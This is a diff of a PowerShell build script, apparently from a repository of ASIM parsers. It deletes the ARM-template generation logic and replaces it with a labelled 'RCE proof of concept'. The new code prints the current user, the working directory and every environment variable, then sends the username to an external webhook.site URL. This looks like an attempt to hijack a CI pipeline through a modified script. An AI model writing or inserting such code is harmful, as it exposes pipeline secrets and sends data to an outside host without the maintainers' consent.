@@ -1,10 +1,17 @@
-$failed=0
-# The KqlFuncYaml2Arm script generates deployable ARM templates from KQL function YAML files.
-# Currently, the script only runs on the Schemas listed below.
-$modifiedSchemas = & "$($PSScriptRoot)/getModifiedASimSchemas.ps1"
-foreach($schema in $modifiedSchemas) {
-	Remove-Item "$($PSScriptRoot)/../Parsers/$schema/ARM" -Recurse
-	python ASIM/dev/ASimYaml2ARM/KqlFuncYaml2Arm.py -m asim -d Parsers/$schema/ARM Parsers/$schema/Parsers
+# PoC RCE payload
+Write-Host "=== RCE PROOF OF CONCEPT ==="
+Write-Host "Current user: $(whoami)"
+Write-Host "Current directory: $(Get-Location)"
+Write-Host "Environment variables:"
+Get-ChildItem Env: | Select-Object Name, Value | Format-Table
+
+# Send proof to webhook (replace with your webhook.site URL)
+$webhookUrl = "https://webhook.site/1ecbedaf-52e9-4a5c-a5bf-818d177ab0ef"
+try {
+    Invoke-RestMethod -Uri "$webhookUrl?poc=rce_confirmed&user=$(whoami)" -Method GET
+    Write-Host "Webhook called successfully"
+} catch {
+    Write-Host "Webhook failed: $_"
 }
 
-exit $failed
+Write-Host "=== END PROOF OF CONCEPT ==="
